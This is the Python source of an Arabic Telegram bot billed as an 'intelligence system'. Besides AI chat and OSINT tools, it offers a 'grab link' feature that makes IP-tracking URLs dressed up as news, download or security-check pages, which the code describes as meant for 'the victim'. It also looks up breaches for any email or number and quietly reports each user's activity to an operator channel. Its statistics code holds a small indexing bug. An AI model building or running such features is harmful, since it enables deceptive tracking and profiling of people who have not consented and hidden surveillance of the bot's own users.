import os
import re
import json
import base64
import hashlib
import time
import asyncio
import logging
import requests
import threading
from datetime import datetime
from collections import defaultdict

# تسجيل الأخطاء في ملف حتى لا تضيع عند تعطل البوت
logging.basicConfig(
    filename="bot_error.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
# إضافة stderr أيضاً: سجلات Render تلتقط stdout/stderr فقط — بدون هذا يموت البوت صامتًا
stderr_handler = logging.StreamHandler()
stderr_handler.setLevel(logging.INFO)
stderr_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logging.getLogger().addHandler(stderr_handler)
logging.getLogger("telegram").setLevel(logging.WARNING)
from tracker_server import create_tracker_app, start_tracker_server
from tools_v3 import (
    HEADER, title_of, DIVIDER,
    add_xp, get_user_stats, profile_card,
    generate_password, password_strength, make_qr_image,
    text_tools_report, age_report, game_start, game_guess,
    schedule_reminder, daily_news_report,
)

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN",    "")
TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "")
ADMIN_ID           = int(os.getenv("ADMIN_ID",      "0"))
TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID",  "")
CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID", "")

GROQ_API_KEY       = os.getenv("GROQ_API_KEY",      "")
TAVILY_API_KEY     = os.getenv("TAVILY_API_KEY",    "")
VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY") or os.getenv("VIRUSTOTAL_KEY", "")
LEAKCHECK_KEY      = os.getenv("LEAKCHECK_KEY",      "")
IPINFO_TOKEN       = os.getenv("IPINFO_TOKEN",       "")

BOT_SERVER_URL     = os.getenv("BOT_SERVER_URL",     "https://")

# ذاكرة مؤقتة للحالات {user_id: state}
pending_states = {}
# ذاكرة مؤقتة لروابط السحب {user_id: label}
pending_grabs  = {}
# ذاكرة المحادثة للذكاء الاصطناعي {user_id: [messages]}
chat_history   = defaultdict(list)
# سجلات روابط السحب {user_id: [logs]}
user_logs      = defaultdict(list)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  👥  قاعدة بيانات المستخدمين
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

USERS_FILE = "users_db.json"

def load_users() -> dict:
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_users(db: dict):
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def register_user(user):
    db = load_users()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {
            "id":         user.id,
            "first_name": user.first_name or "",
            "username":   user.username or "",
            "joined":     datetime.now().strftime("%Y-%m-%d %H:%M"),
        }
        save_users(db)

def get_all_user_ids() -> list[int]:
    db = load_users()
    return [int(uid) for uid in db.keys()]

def get_users_count() -> int:
    return len(load_users())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔔  الإشعارات والمراقبة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _tg_post(token: str, chat_id: str, text: str, parse_mode: str = "Markdown"):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text[:4096],
                "parse_mode": parse_mode,
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if r.status_code != 200:
            print(f"[CONTROL] ⚠️ فشل إرسال لـ {chat_id} — {r.status_code}: {r.text[:80]}")
        return r.status_code == 200
    except Exception as e:
        print(f"[CONTROL] ⚠️ استثناء: {e}")
        return False


def notify_control(user, action: str):
    """يُرسل نشاط المستخدم إلى قناة المراقبة"""
    uname = f"@{user.username}" if user.username else "لا يوجد"
    msg = (
        "👁 *راشد — نشاط مستخدم*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 الاسم  : {user.full_name}\n"
        f"🆔 ID     : `{user.id}`\n"
        f"📛 معرف   : {uname}\n"
        f"🕐 الوقت  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"📌 الإجراء: {action}\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    sent = _tg_post(MAIN_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)
    if not sent:
        _tg_post(TRACKER_BOT_TOKEN, CONTROL_CHANNEL_ID, msg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  الذكاء الاصطناعي | Groq AI + Tavily Search
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYSTEM_PROMPT = (
    "أنت مساعد ذكاء اصطناعي اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "تحدث مع المستخدم بشكل طبيعي ومباشر وودي، كأنك صديق له.\n"
    "ابتعد عن الرسميات المبالغ فيها والردود الطويلة المملة.\n"
    "إذا قال لك 'مرحبا'، رد بـ 'أهلاً بك! كيف يمكنني مساعدتك اليوم؟' أو ما شابه، دون تعريف الكلمة أو ذكر مصادرها.\n"
    "أجب على قدر السؤال بوضوح واختصار مفيد.\n"
    "لا تستخدم عناوين أو نقاط إلا إذا كان الموضوع يتطلب ذلك فعلاً.\n"
    "اختم ردك بـ: ✦ راشد"
)

CODE_SYSTEM_PROMPT = (
    "أنت خبير برمجة متخصص اسمك «راشد»، صُنعت بواسطة راشد خليل أبو زيتونه.\n"
    "عند تحليل الأكواد البرمجية:\n"
    "1. اشرح ما يفعله الكود بشكل مفصّل.\n"
    "2. حدّد أي أخطاء أو مشاكل (Bugs) إن وجدت.\n"
    "3. اقترح تحسينات وممارسات أفضل (Best Practices).\n"
    "4. إذا كان فيه خطأ، اكتب الكود المصحّح.\n"
    "5. اشرح التعقيد الزمني (Time Complexity) إن كان ذا صلة.\n"
    "تحدث بالعربية بشكل واضح ومنظّم مع أمثلة.\n"
    "اختم كل رد بـ: ✦ راشد — راشد خليل أبو زيتونه"
)


def _wrap_ai_response(reply: str) -> str:
    """يُحسّن تنسيق رد الذكاء الاصطناعي ليبدو داخل بوكس احترافي"""
    header = (
        "```\n"
        "┌─────────────────────────────┐\n"
        "│   🤖  راشد الذكاء الاصطناعي  │\n"
        "└─────────────────────────────┘\n"
        "```\n"
    )
    return header + reply + "\n\n✦ راشد"


def ask_groq(user_id: int, prompt: str, use_internet: bool = True) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."

    try:
        context_msgs = chat_history[user_id][-6:]
        messages = [{"role": "system", "content": SYSTEM_PROMPT}]
        messages.extend(context_msgs)
        
        final_prompt = prompt
        if use_internet and TAVILY_API_KEY:
            # البحث بالعربية أولاً، وإن لم توجد نتائج نبحث بالإنجليزية لضمان الحصول على معلومات
            search_results = tavily_search(prompt)
            if not search_results:
                search_results = tavily_search(prompt + " in English", english=True)
            if search_results:
                final_prompt = f"المعلومات من الإنترنت:\n{search_results}\n\nسؤال المستخدم: {prompt}"

        messages.append({"role": "user", "content": final_prompt})

        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": messages,
                "temperature": 0.7,
                "max_tokens": 1024,
            },
            timeout=25,
        )
        if r.status_code == 200:
            reply = r.json()["choices"][0]["message"]["content"]
            chat_history[user_id].append({"role": "user", "content": prompt})
            chat_history[user_id].append({"role": "assistant", "content": reply})
            return reply
        elif r.status_code == 401:
            # مفتاح Groq مرفوض (منتهي أو غير صالح) — إرجاع رد احتياطي واضح
            logging.error("Groq API returned 401 Unauthorized — invalid/expired key")
            return "⛔ خدمة الذكاء الاصطناعي غير متاحة حالياً (مفتاح Groq منتهي). تواصل مع المطوّر لاستبداله."
        elif r.status_code == 429:
            return "⏳ تجاوزت حد الاستخدام لخدمة الذكاء الاصطناعي. انتظر دقيقة ثم أعد المحاولة."
        else:
            return f"⚠️ خطأ في الذكاء الاصطناعي: {r.status_code}"
    except Exception as e:
        return f"❌ فشل الاتصال بالذكاء الاصطناعي: {e}"


def analyze_code(code: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."
    try:
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.3-70b-versatile",
                "messages": [
                    {"role": "system", "content": CODE_SYSTEM_PROMPT},
                    {"role": "user", "content": f"حلل هذا الكود:\n\n{code}"}
                ],
                "temperature": 0.3,
            },
            timeout=30,
        )
        if r.status_code == 200:
            return r.json()["choices"][0]["message"]["content"]
        return f"⚠️ خطأ في تحليل الكود: {r.status_code}"
    except Exception as e:
        return f"❌ فشل تحليل الكود: {e}"


def analyze_image_groq(image_bytes: bytes, caption: str) -> str:
    if not GROQ_API_KEY:
        return "⛔ مفتاح Groq API غير متوفر."
    try:
        base64_image = base64.b64encode(image_bytes).decode('utf-8')
        r = requests.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {GROQ_API_KEY}"},
            json={
                "model": "llama-3.2-90b-vision-preview",
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": caption},
                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                        ]
                    }
                ],
            },
            timeout=30,
        )
        if r.status_code == 200:
            return r.json()["choices"][0]["message"]["content"]
        return f"⚠️ خطأ في تحليل الصورة: {r.status_code}"
    except Exception as e:
        return f"❌ فشل تحليل الصورة: {e}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌐  أدوات الاستخبارات | OSINT Tools
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def tavily_search(query: str, english: bool = False) -> str:
    if not TAVILY_API_KEY: return ""
    try:
        body = {
            "api_key": TAVILY_API_KEY,
            "query": query,
            "search_depth": "advanced",
            "max_results": 5
        }
        if english:
            body["include_answer"] = True
        r = requests.post(
            "https://api.tavily.com/search",
            json=body,
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            results = data.get("results", [])
            lines = []
            if english and data.get("answer"):
                lines.append(f"ملخص: {data['answer'][:400]}")
            lines.extend([f"- {res['title']}: {res['content'][:200]}... ({res['url']})" for res in results])
            out = "\n".join(lines)
            if out:
                return out
    except Exception as e:
        logging.warning("Tavily search failed: %s", e)
    return ""


def analyze_ip(ip: str) -> str:
    try:
        # ipinfo.io
        r1 = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=10)
        d1 = r1.json() if r1.status_code == 200 else {}
        
        # ip-api.com (Advanced)
        r2 = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=10)
        d2 = r2.json() if r2.status_code == 200 else {}

        if not d1 and not d2: return "❌ تعذر جلب بيانات الـ IP."

        res = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   🌐  تحليل عنوان IP    │\n"
            "└─────────────────────────┘\n"
            "```\n"
            f"📍 *IP:* `{ip}`\n"
            f"🏳️ *الدولة:* {d2.get('country', d1.get('country', 'N/A'))}\n"
            f"🏙️ *المدينة:* {d2.get('city', d1.get('city', 'N/A'))}\n"
            f"🏢 *المزود:* {d2.get('isp', d1.get('org', 'N/A'))}\n"
            f"🌐 *Hostname:* `{d2.get('reverse', d1.get('hostname', 'N/A'))}`\n"
            f"🔍 *النوع:* {'⚠️ VPN/Proxy' if d2.get('proxy') else ('🏢 Hosting' if d2.get('hosting') else '✅ حقيقي')}\n"
            f"📱 *هاتف:* {'نعم' if d2.get('mobile') else 'لا'}\n"
            f"🏛️ *ASN:* {d2.get('as', 'N/A')}\n"
            f"🗺️ *الإحداثيات:* `{d1.get('loc', 'N/A')}`\n"
            "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
        )
        return res
    except Exception as e:
        return f"❌ خطأ في تحليل IP: {e}"


def cmd_osint_search(query: str) -> str:
    if not TAVILY_API_KEY: return "⛔ مفتاح Tavily غير متوفر."
    
    try:
        r = requests.post(
            "https://api.tavily.com/search",
            json={
                "api_key": TAVILY_API_KEY,
                "query": query,
                "search_depth": "advanced",
                "include_answer": True,
                "max_results": 5
            },
            timeout=20
        )
        if r.status_code != 200: return f"⚠️ خطأ في البحث: {r.status_code}"
        
        data = r.json()
        results = data.get("results", [])
        answer  = data.get("answer")
        
        report = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   📡  تقرير OSINT       │\n"
            "└─────────────────────────┘\n"
            "```\n"
            f"🔎 *الاستعلام:* `{query}`\n\n"
        )
        if answer:
            report += f"📌 *ملخص:*\n{answer[:500]}\n\n"
        report += "📂 *المصادر:*\n"
        for i, res in enumerate(results[:4], 1):
            title = res.get("title", "—")[:60]
            url   = res.get("url", "#")
            snip  = res.get("content", "")[:120]
            report += f"\n{i}▪ *{title}*\n   🔗 {url}\n   ↳ {snip}...\n"
        report += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — راشد خليل أبو زيتونه"
        return report
    except Exception as e:
        return f"❌ فشل بحث OSINT: {e}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔗  توليد رابط سحب IP | Grab Link
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PAGE_TYPES = {
    "news":     "📰 صفحة إخبارية",
    "download": "📥 تحميل ملف",
    "bot":      "🤖 توجيه للبوت",
    "verify":   "🔒 تحقق أمني",
}


def generate_grab_link(user_id: int, label: str, page_type: str = "news") -> str:
    if not BOT_SERVER_URL or BOT_SERVER_URL == "https://":
        return "⛔ رابط الخادم غير مُهيّأ."
    session_id  = hashlib.sha256(f"{user_id}-{label}-{datetime.now()}".encode()).hexdigest()[:12]
    tracker_url = f"{BOT_SERVER_URL}/track/{user_id}/{session_id}/{page_type}"
    user_logs[user_id].append({
        "session_id": session_id,
        "url":        tracker_url,
        "label":      label,
        "page":       PAGE_TYPES.get(page_type, page_type),
        "timestamp":  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })
    return tracker_url


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎨  الواجهة الرئيسية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def build_main_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🤖 ذكاء اصطناعي",   callback_data="cb_ai"),
            InlineKeyboardButton("💻 تحليل كود",       callback_data="cb_code"),
        ],
        [
            InlineKeyboardButton("🛡️ فحص رابط",       callback_data="cb_scan"),
            InlineKeyboardButton("🌐 تحليل IP",        callback_data="cb_ip"),
        ],
        [
            InlineKeyboardButton("👤 بحث مستخدم",     callback_data="cb_user"),
            InlineKeyboardButton("🔍 بحث OSINT",       callback_data="cb_osint"),
        ],
        [
            InlineKeyboardButton("🕵️ رابط سحب IP",    callback_data="cb_grab"),
            InlineKeyboardButton("🔎 Whois نطاق",      callback_data="cb_whois"),
        ],
        [
            InlineKeyboardButton("📋 سجلاتي",          callback_data="cb_mylogs"),
            InlineKeyboardButton("🧹 مسح المحادثة",    callback_data="cb_clear"),
        ],
        [
            InlineKeyboardButton("🧰 الأدوات",          callback_data="cb_tools"),
            InlineKeyboardButton("🎮 لعبة التخمين",      callback_data="cb_play"),
        ],
        [
            InlineKeyboardButton("📄 بطاقتي",           callback_data="cb_profile"),
            InlineKeyboardButton("📰 أخبار اليوم",       callback_data="cb_news"),
        ],
        [
            InlineKeyboardButton("📞 الدعم",            callback_data="cb_support"),
            InlineKeyboardButton("ℹ️ المساعدة",         callback_data="cb_help"),
        ],
    ]
    keyboard.insert(-1, [
        InlineKeyboardButton("🔍 فحص التسريبات",     callback_data="cb_leakcheck"),
    ])
    if is_admin:
        keyboard.insert(-1, [
            InlineKeyboardButton("🔬 VirusTotal",        callback_data="cb_vt"),
            InlineKeyboardButton("📊 الإحصائيات",       callback_data="cb_stats"),
        ])
        keyboard.insert(-1, [
            InlineKeyboardButton("📢 إرسال جماعي",      callback_data="cb_broadcast_panel"),
        ])
    return InlineKeyboardMarkup(keyboard)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات الأوامر | Command Handlers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user)
    notify_control(user, "بدء الاستخدام")
    
    s = get_user_stats(user.id)
    welcome = (
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  ✦ 𝐑𝐚𝐬𝐡𝐞𝐝 𝐀𝐈 ✦      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"👋 أهلاً بك يا *{user.first_name}* في نظام راشد الاستخباراتي v3!\n"
        f"🏅 *لقبك:* {s['title']}\n\n"
        "🚀 *منظومة القدرات:*\n"
        "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅\n"
        "🕵️ سحب روابط IP مع تعقب\n"
        "🌐 تحليل IP + Whois نطاقات\n"
        "🔍 بحث OSINT متعمق\n"
        "🧪 فحص التسريبات + VirusTotal\n"
        "🧰 أدوات ذكية: كلمات مرور، QR، Morse\n"
        "🎮 ألعاب تحفزك ونقاط XP بمستويات\n\n"
        "📄 *بطاقتك:* /profile\n"
        "⚡ كلما استخدمت البوت كلما ارتفعت بمستواك!\n\n"
        "اختر من القائمة أدناه للبدء 👇"
    )
    
    add_xp(user.id, 5)
    await update.message.reply_text(
        welcome,
        parse_mode="Markdown",
        reply_markup=build_main_keyboard(user.id == ADMIN_ID)
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ℹ️  دليل النظام      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "─ ✦ ───── *أوامر الاستخبارات* ───── ✦ ─\n"
        "🕵️ /grab — رابط سحب IP\n"
        "📋 /mylogs — سجلاتك\n"
        "🔍 /osint — بحث استخباري\n"
        "🌐 /ip — تحليل عنوان IP\n"
        "📡 /whois — معلومات النطاق\n"
        "🧪 /leakcheck — فحص التسريبات\n"
        "🔬 /vt — فحص VirusTotal\n\n"
        "─ ✦ ───── *الأدوات الذكية* ───── ✦ ─\n"
        "🧰 /tools — صندوق الأدوات\n"
        "🔑 /generate — كلمة مرور آمنة\n"
        "🔒 /strong — فحص قوة كلمة المرور\n"
        "📱 /qr — صانع QR Code\n"
        "🧩 /texttools — Morse وBase64\n"
        "🎂 /age — حاسبة العمر\n"
        "🔢 /count — عداد النص\n"
        "⏰ /remind — تذكير بعد دقائق\n"
        "📰 /news — نشرة أخبار اليوم\n\n"
        "─ ✦ ───── *حسابك* ───── ✦ ─\n"
        "📄 /profile — بطاقتك ومستواك\n"
        "🎮 /play — لعبة التخمين (+XP)\n"
        "🧹 /clear — مسح الذاكرة\n\n"
        "✦ راشد"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")


async def cmd_grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not BOT_SERVER_URL:
        await update.message.reply_text("⛔ رابط الخادم غير مُهيّأ. تواصل مع المطوّر.")
        return
    
    label = " ".join(context.args) if context.args else "رابط عام"
    pending_grabs[user.id] = label
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📰 صفحة إخبارية", callback_data="cb_grab_news")],
        [InlineKeyboardButton("📥 تحميل ملف",   callback_data="cb_grab_download")],
        [InlineKeyboardButton("🤖 توجيه للبوت",  callback_data="cb_grab_bot")],
        [InlineKeyboardButton("🔒 تحقق أمني",   callback_data="cb_grab_verify")],
    ])
    await update.message.reply_text("🕵️ اختر نوع الصفحة التي سيراها الضحية:", reply_markup=kb)


async def cmd_mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logs = user_logs.get(user.id, [])
    if not logs:
        await update.message.reply_text("📭 ليس لديك أي روابط نشطة حالياً.")
        return
    
    text = "📋 *سجلات روابطك النشطة:*\n\n"
    for i, log in enumerate(logs, 1):
        text += f"{i}▪ *{log['label']}*\n   🔗 `{log['url']}`\n   📅 {log['timestamp']}\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_history[user.id] = []
    await update.message.reply_text("🧹 تم مسح ذاكرة المحادثة بنجاح.")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    db = load_users()
    count = len(db)
    today = datetime.now().strftime("%Y-%m-%d")
    joined_today = sum(1 for u in db.values() if str(u.get("joined", "")).startswith(today))
    dates = sorted(str(u.get("joined", "")).strip() for u in db.values() if u.get("joined"))
    first_user = db[dates[0]] if dates else None
    last_user = db[dates[-1]] if dates else None
    text = (
        "📊 *إحصائيات النظام:*\n\n"
        f"👥 إجمالي المستخدمين: *{count}*\n"
        f"🆕 مشترك اليوم: *{joined_today}*\n"
    )
    if first_user:
        text += (
            f"\n🥇 أول مشترك: {first_user.get('first_name','—')} `@{first_user.get('username','—')}` "
            f"({first_user.get('joined','—')})\n"
        )
    if last_user:
        text += (
            f"\n🕐 آخر مشترك: {last_user.get('first_name','—')} `@{last_user.get('username','—')}` "
            f"({last_user.get('joined','—')})\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📢  الإرسال الجماعي (للمدير فقط)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/broadcast <نص الرسالة> — إرسال جماعي لجميع المستخدمين (المدير فقط)"""
    user = update.effective_user
    if user.id != ADMIN_ID:
        await update.message.reply_text("⛔ هذا الأمر للمدير فقط.")
        return
    text = update.message.text
    _, _, msg_text = text.partition("/broadcast")
    msg_text = msg_text.strip()
    if not msg_text:
        await update.message.reply_text(
            "📢 *طريقة الاستخدام:*\n\n"
            "`/broadcast` نص الرسالة الجماعية\n\n"
            "مثال:\n`/broadcast مرحباً! تم تحديث البوت ✨`",
            parse_mode="Markdown",
        )
        return
    pending_states[user.id] = "broadcast_confirm"
    context.user_data["pending_broadcast"] = msg_text[:4096]
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ نعم، أرسل للجميع", callback_data="cb_broadcast_yes")],
        [InlineKeyboardButton("❌ إلغاء", callback_data="cb_broadcast_no")],
    ])
    await update.message.reply_text(
        f"📢 *معاينة الرسالة الجماعية:*\n\n{msg_text[:500]}\n\n"
        "هل تريد إرسالها لجميع المستخدمين؟",
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def _execute_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """يُنفَّذ بعد تأكيد المدير عبر الزر"""
    target = update.effective_message
    msg_text = context.user_data.pop("pending_broadcast", "")
    pending_states.pop(update.effective_user.id, None)
    if not msg_text:
        await target.reply_text("⚠️ لا توجد رسالة معلقة للإرسال.")
        return
    ids = get_all_user_ids()
    if not ids:
        await target.reply_text("📭 لا يوجد مستخدمون مسجّلون.")
        return
    n = len(ids)
    status = await target.reply_text(f"📢 جاري الإرسال إلى {n} مستخدم... (0/{n})")
    ok, blocked = 0, 0
    try:
        for i, uid in enumerate(ids):
            success = _tg_post(MAIN_BOT_TOKEN, str(uid), msg_text)
            if success:
                ok += 1
            else:
                blocked += 1
            # مهلة لتجنّب قيود Telegram API (429 Too Many Requests)
            await asyncio.sleep(0.4)
            # تحديث الحالة كل 60 مستخدم أو عند الاكتمال (لحماية حد Telegram لتعديل الرسائل)
            if i % 60 == 59 or i == n - 1:
                await status.edit_text(f"📢 جاري الإرسال... ({i + 1}/{n})")
        await status.edit_text(
            f"✅ *اكتمل الإرسال الجماعي*\n\n"
            f"📤 أُرسلت بنجاح: *{ok}*\n"
            f"🚫 فشلت (مستخدم حجب البوت أو حذف حسابه): *{blocked}*\n"
            f"👥 إجمالي القائمة: *{n}*",
            parse_mode="Markdown",
        )
        print(f"[BROADCAST] ✅ تم: {ok} نجح، {blocked} فشل من {n}")
    except Exception as e:
        print(f"[BROADCAST] ❌ خطأ: {e}")
        await status.edit_text(f"⚠️ حدث خطأ أثناء الإرسال: {e}")


async def _cb_broadcast_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔ هذا الإجراء للمدير فقط.", show_alert=True)
        return
    await query.answer()
    if query.data == "cb_broadcast_yes":
        await _execute_broadcast(update, context)
    else:
        pending_states.pop(query.from_user.id, None)
        context.user_data.pop("pending_broadcast", None)
        await query.message.edit_text("🚫 تم إلغاء الإرسال الجماعي.")


async def cmd_vt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = context.args[0] if context.args else ""
    if not url:
        await update.message.reply_text("🔬 يرجى إرسال الرابط للفحص: `/scan https://example.com`", parse_mode="Markdown")
        return
    
    if not VIRUSTOTAL_API_KEY:
        await update.message.reply_text("⛔ مفتاح VirusTotal غير متوفر.")
        return

    msg = await update.message.reply_text("🔬 جاري فحص الرابط عبر VirusTotal...")
    try:
        # 1. Submit URL
        r = requests.post(
            "https://www.virustotal.com/api/v3/urls",
            headers={"x-apikey": VIRUSTOTAL_API_KEY},
            data={"url": url},
            timeout=15
        )
        if r.status_code != 200:
            await msg.edit_text(f"⚠️ خطأ في VirusTotal: {r.status_code}")
            return
        
        analysis_id = r.json()["data"]["id"]
        
        # 2. Get Report (Wait a bit)
        time.sleep(2)
        r = requests.get(
            f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
            headers={"x-apikey": VIRUSTOTAL_API_KEY},
            timeout=15
        )
        if r.status_code == 200:
            stats = r.json()["data"]["attributes"]["stats"]
            res = (
                "```\n"
                "┌─────────────────────────┐\n"
                "│   🛡️  تقرير VirusTotal   │\n"
                "└─────────────────────────┘\n"
                "```\n"
                f"🔗 *الرابط:* `{url}`\n\n"
                f"✅ سليم: `{stats['harmless'] + stats['undetected']}`\n"
                f"⚠️ مشبوه: `{stats['suspicious']}`\n"
                f"❌ خبيث: `{stats['malicious']}`\n"
                f"🚫 فشل: `{stats['timeout']}`\n"
                "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
            )
            await msg.edit_text(res, parse_mode="Markdown")
        else:
            await msg.edit_text("⚠️ تعذر جلب التقرير حالياً.")
    except Exception as e:
        await msg.edit_text(f"❌ خطأ: {e}")


async def cmd_leakcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = context.args[0] if context.args else ""
    if not query:
        await update.message.reply_text("🔍 يرجى إرسال البريد أو الرقم للفحص: `/leakcheck email@example.com`", parse_mode="Markdown")
        return
    
    if not LEAKCHECK_KEY:
        await update.message.reply_text("⛔ مفتاح LeakCheck غير متوفر.")
        return

    msg = await update.message.reply_text("🔍 جاري فحص التسريبات...")
    try:
        r = requests.get(
            f"https://leakcheck.io/api/v2/query/{query}?key={LEAKCHECK_KEY}",
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("success") and data.get("found", 0) > 0:
                sources = data.get("sources", [])
                res = (
                    "```\n"
                    "┌─────────────────────────┐\n"
                    "│   🔍  نتائج التسريبات   │\n"
                    "└─────────────────────────┘\n"
                    "```\n"
                    f"📧 *الهدف:* `{query}`\n"
                    f"⚠️ *عدد التسريبات:* `{data['found']}`\n\n"
                    "*أبرز المصادر:*\n"
                )
                for s in sources[:5]:
                    res += f"• {s.get('name', 'غير معروف')} ({s.get('date', 'N/A')})\n"
                res += "\n━━━━━━━━━━━━━━━━━━━━━\n✦ راشد"
                await msg.edit_text(res, parse_mode="Markdown")
            else:
                await msg.edit_text("✅ لم يتم العثور على تسريبات لهذا الهدف.")
        else:
            await msg.edit_text(f"⚠️ خطأ في LeakCheck: {r.status_code}")
    except Exception as e:
        await msg.edit_text(f"❌ خطأ: {e}")


